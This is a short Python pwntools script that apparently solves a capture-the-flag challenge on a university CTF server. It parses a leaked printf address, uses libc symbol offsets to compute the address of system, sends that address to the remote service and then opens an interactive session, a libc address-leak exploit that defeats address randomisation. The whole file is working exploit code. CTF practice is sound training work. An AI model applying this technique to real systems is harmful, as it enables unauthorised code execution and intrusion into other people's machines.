from pwn import *


libc = ELF('./libc.so.6')
system = libc.symbols['system']
printf = libc.symbols['printf']

# p = process('./bin')
p = remote('cyberchallenge.disi.unitn.it', 9100)


p.recvuntil(b'is at ')
leaked_printf = int(p.recvuntil(b',')[:-1].strip(), 16)
p.recvuntil(b'?')

offset = system - printf
system_addr = leaked_printf + offset

p.sendline(str(system_addr).encode())

p.interactive()
